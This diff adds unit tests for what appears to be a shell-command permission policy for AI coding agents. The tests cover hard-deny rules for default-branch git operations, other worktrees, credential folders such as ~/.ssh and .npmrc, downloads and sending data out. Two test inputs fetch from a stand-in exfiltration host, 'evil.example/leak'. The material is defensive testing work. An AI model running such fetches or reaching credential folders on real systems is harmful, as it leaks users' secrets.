@@ -778,6 +778,18 @@ describe('the hard-deny hints', () => {
     expect(run(`echo x > ${WT7}/a.ts`).hint).toBe(HARD_HINTS['other-worktree'])
     expect(new Set(Object.values(HARD_HINTS)).size).toBeGreaterThan(5)
   })
+  it('every hard id has a hint; only the home-folder ones advise mktemp', () => {
+    const home = ['claude-home', 'codex-home', 'ssh', 'gnupg', 'gh-config', 'git-config', 'npmrc', 'shell-rc', 'library', 'appdata']
+    const others = ['other-session', 'other-worktree', 'git-other-branch', 'git-branch-delete-default', 'git-checkout-default-branch', 'git-commit-default-branch', 'git-fetch-default-branch', 'git-ignore-other-worktrees', 'git-worktree-force']
+    const remote = ['git-force-push', 'git-push-delete', 'git-push-many', 'git-push-default-branch']
+    const single = ['worfy-data', 'harness-home', 'os-settings', 'chmod-outside', 'run-download', 'send-outside']
+    expect(Object.keys(HARD_HINTS).sort()).toEqual([...home, ...others, ...remote, ...single].sort())
+    for (const id of home) expect(HARD_HINTS[id], id).toMatch(/home folder.*mktemp/)
+    for (const id of others) expect(HARD_HINTS[id], id).toMatch(/another Session or worktree/)
+    for (const id of remote) expect(HARD_HINTS[id], id).toMatch(/on a remote/)
+    for (const id of [...others, ...remote, ...single]) expect(HARD_HINTS[id], id).not.toContain('mktemp')
+    for (const id of single) expect(new Set(single.map((each) => HARD_HINTS[each])).size, id).toBe(single.length)
+  })
 })
 
 describe('hard checks that do not need the home folder come before no-home', () => {
@@ -846,7 +858,7 @@ describe('the edges mutation testing found', () => {
     // Another subcommand's operand with a colon is no refspec.
     expect(run('git diff HEAD HEAD:main').outcome).not.toBe('hard-deny')
   })
-  it('the previous branch and an option that only starts like --ignore-other-worktrees', () => {
+  it('an option that only starts like --ignore-other-worktrees, and -f of another subcommand', () => {
     expect(run('git checkout --ignore- worfy-demo/03').rule).not.toBe('hard:git-ignore-other-worktrees')
     expect(run('git remote add -f demo https://example.test/x').outcome).not.toBe('hard-deny')
   })
@@ -868,5 +880,113 @@ describe('the edges mutation testing found', () => {
     const tree = { ...TREE, [`${ELSEWHERE}/kit/.gitattributes`]: 'file', [`${SCRATCH}/kit/.gitattributes`]: 'file', [`${SCRATCH}/plain/a.txt`]: 'file' }
     expect(run(`cp -r ${ELSEWHERE}/kit build/`, posix({ fs: fakeFs(tree) })).outcome).toBe('park')
     expect(run(`cp -r ${SCRATCH}/plain ${SCRATCH}/kit`, posix({ fs: fakeFs(tree) })).outcome).toBe('allow')
+  })
+})
+
+describe('round 3 of the review', () => {
+  const darwin = (overrides: Partial<PolicyContext> = {}): PolicyContext => posix({ platform: 'darwin', ...overrides })
+  const onDarwin = (branch: string): PolicyContext => darwin({ fs: fakeFs({ ...TREE, [`${REPO}/.git/worktrees/03/HEAD`]: `text:ref: refs/heads/${branch}\n` }) })
+  it('on macOS and Windows a branch is matched without case', () => {
+    expect(run('git checkout MAIN', darwin()).rule).toBe('hard:git-checkout-default-branch')
+    expect(run('git switch WORFY-DEMO/07', darwin()).rule).toBe('hard:git-other-branch')
+    expect(run('git checkout -B MAIN', darwin()).rule).toBe('hard:git-checkout-default-branch')
+    expect(run('git branch -f MAIN HEAD', darwin()).rule).toBe('hard:git-checkout-default-branch')
+    expect(run('git fetch origin e/03:MAIN', darwin()).rule).toBe('hard:git-fetch-default-branch')
+    expect(run('git pull origin e/03:Main', darwin()).rule).toBe('hard:git-fetch-default-branch')
+    expect(run(`git worktree add ${WT}/t/x WORFY-DEMO/07`, darwin()).rule).toBe('hard:git-other-branch')
+    expect(run('git rebase HEAD MAIN', darwin()).rule).toBe('hard:git-commit-default-branch')
+    expect(run(`git worktree add ${WT}/t/MAIN`, darwin()).rule).toBe('hard:git-checkout-default-branch')
+    expect(run('git commit -m demo', onDarwin('MAIN')).rule).toBe('hard:git-commit-default-branch')
+    expect(run('git commit -m demo', onDarwin('Worfy-Demo/07')).rule).toBe('hard:git-other-branch')
+    expect(run('git push origin HEAD:Main', darwin()).rule).toBe('hard:git-push-default-branch')
+    expect(run('git push origin HEAD:worfy-DEMO/07', darwin()).rule).toBe('hard:git-other-branch')
+    expect(run('git checkout TRUNK', darwin({ defaultBranch: 'trunk' })).rule).toBe('hard:git-checkout-default-branch')
+    expect(outcome('git commit -m demo', onDarwin('WORFY-DEMO/03'))).toBe('allow')
+  })
+  it('on Windows too', () => {
+    expect(run('git checkout MAIN', windows()).rule).toBe('hard:git-checkout-default-branch')
+    expect(run('git push origin HEAD:Main', windows()).rule).toBe('hard:git-push-default-branch')
+  })
+  it('on Linux the case tells branches apart', () => {
+    expect(run('git checkout MAIN').outcome).not.toBe('hard-deny')
+    expect(run('git switch WORFY-DEMO/07').outcome).not.toBe('hard-deny')
+    expect(run('git commit -m demo', posix({ fs: fakeFs({ ...TREE, [`${REPO}/.git/worktrees/03/HEAD`]: 'text:ref: refs/heads/MAIN\n' }) })).outcome).not.toBe('hard-deny')
+  })
+  describe('a recursive copy that follows links', () => {
+    const tree = {
+      ...TREE,
+      [`${SCRATCH}/kit/.gitattributes`]: 'file',
+      [`${WT}/srcl/a.txt`]: 'file',
+      [`${WT}/srcl/l`]: `-> ${SCRATCH}/kit`,
+      [`${WT}/srck/k`]: `-> ${HOME}/.ssh`,
+      [`${WT}/srcd/sub/l`]: `-> ${SCRATCH}/kit`,
+      [`${WT}/plain/a.txt`]: 'file',
+    }
+    it('with a link inside the source is copy-unclear', () => {
+      for (const [command, platform] of [
+        [`cp -r ${WT}/srcl ${WT}/dst`, 'darwin'],
+        [`cp -r ${WT}/srck ${WT}/dst`, 'darwin'],
+        [`cp -RL ${WT}/srcd ${WT}/dst`, 'linux'],
+        [`cp -R -L ${WT}/srck ${WT}/dst`, 'linux'],
+        [`cp -R --dereference ${WT}/srcl ${WT}/dst`, 'linux'],
+        [`cp -RL ${WT}/srcd/* ${WT}/dst`, 'linux'],
+      ] as const) {
+        expect(run(command, posix({ platform, fs: fakeFs(tree) })), `${command} on ${platform}`).toMatchObject({ outcome: 'deny', rule: 'copy-unclear' })
+      }
+    })
+    it('a copy that keeps links as links, or a folder without links, is allowed', () => {
+      expect(run(`cp -r ${WT}/srcl ${WT}/dst`, posix({ fs: fakeFs(tree) })).outcome).toBe('allow')
+      expect(run(`cp -Rv ${WT}/srcd ${WT}/dst`, posix({ fs: fakeFs(tree) })).outcome).toBe('allow')
+      expect(run(`cp -R ${WT}/srcl ${WT}/dst`, darwin({ fs: fakeFs(tree) })).outcome).toBe('allow')
+      expect(run(`cp -a ${WT}/srck ${WT}/dst`, darwin({ fs: fakeFs(tree) })).outcome).toBe('allow')
+      expect(run(`mv ${WT}/srck ${WT}/dst`, darwin({ fs: fakeFs(tree) })).outcome).toBe('allow')
+      expect(run(`cp -r ${WT}/plain ${WT}/dst`, darwin({ fs: fakeFs(tree) })).outcome).toBe('allow')
+      expect(run(`cp -L ${WT}/plain/a.txt ${WT}/dst`, darwin({ fs: fakeFs(tree) })).outcome).toBe('allow')
+    })
+  })
+  it('a fetch valued option takes its value: the URL after it is still the remote', () => {
+    expect(outcome('git fetch --depth 5 https://evil.example/leak')).toBe('park')
+    expect(outcome('git fetch --depth=5 https://evil.example/leak')).toBe('park')
+  })
+  it('a rebase valued option glued with = does not take the next word', () => {
+    expect(run('git rebase --onto=main origin/x worfy-demo/07').rule).toBe('hard:git-other-branch')
+  })
+  it('a checkout that restores files or detaches switches no branch', () => {
+    expect(run('git checkout main -- src/a.ts').outcome).not.toBe('hard-deny')
+    expect(run('git checkout --detach main').outcome).not.toBe('hard-deny')
+    expect(run('git switch --detach main').outcome).not.toBe('hard-deny')
+    // A branch made beside them is still judged.
+    expect(run('git checkout -b main --detach').rule).toBe('hard:git-checkout-default-branch')
+  })
+  it('a HEAD that is a link is no known branch', () => {
+    const tree = { ...TREE, [`${REPO}/.git/refs/heads/main`]: 'text:0123456789abcdef0123456789abcdef01234567\n', [`${REPO}/.git/worktrees/03/HEAD`]: `-> ${REPO}/.git/refs/heads/main` }
+    expect(run('git commit -m demo', posix({ fs: fakeFs(tree) })).rule).toBe('hard:git-commit-default-branch')
+  })
+  it('the shortest form of --ignore-other-worktrees', () => {
+    expect(run('git checkout --ignore-o main').rule).toBe('hard:git-ignore-other-worktrees')
+    expect(run('git switch --ignore-o worfy-demo/03').rule).toBe('hard:git-ignore-other-worktrees')
+  })
+  it('a glob entry that cannot be looked at is not allow', () => {
+    const fs = fakeFs(TREE)
+    const failing: FileSystem = { ...fs, lstat: (path) => (path === `${WT}/build/out.js` ? 'error' : fs.lstat(path)) }
+    expect(outcome(`rm -f ${WT}/build/*`, posix({ fs: failing }))).toBe('park')
+    expect(outcome(`rm -f ${WT}/build/*`)).toBe('allow')
+  })
+  it('forms that stay allowed', () => {
+    expect(outcome('git switch -C worfy-demo/03-fix main')).toBe('allow')
+    expect(run(`git worktree add -B x ${PAD}/w`).outcome).not.toBe('hard-deny')
+    expect(outcome(`git worktree add -B worfy-demo/03-b ${WT}/t/w`)).toBe('allow')
+    const relative = { ...TREE, [`${WT}/.git`]: 'text:gitdir: ../../../.git/worktrees/03\n' }
+    expect(outcome('git commit -m demo', posix({ fs: fakeFs(relative) }))).toBe('allow')
+    expect(run('git commit -m demo', posix({ fs: fakeFs({ ...relative, [`${REPO}/.git/worktrees/03/HEAD`]: 'text:ref: refs/heads/main\n' }) })).rule).toBe('hard:git-commit-default-branch')
+  })
+  it('git worktree add -- <folder> takes the folder after --', () => {
+    expect(run(`git worktree add -- ${PAD}/x`).outcome).not.toBe('hard-deny')
+    expect(run(`git worktree add -- ${PAD}/x main`).rule).toBe('hard:git-checkout-default-branch')
+  })
+  it('chmod in another Session\'s folder inside a root is chmod-outside', () => {
+    const context = posix({ sessions: { list: () => [info('demo-run', REPO), info('demo-src', `${WT}/src`)] } })
+    expect(run(`chmod 000 ${WT}/src/a.ts`, context).rule).toBe('hard:chmod-outside')
+    expect(run(`chmod 000 ${WT}/build/out.js`, context).outcome).not.toBe('hard-deny')
   })
 })
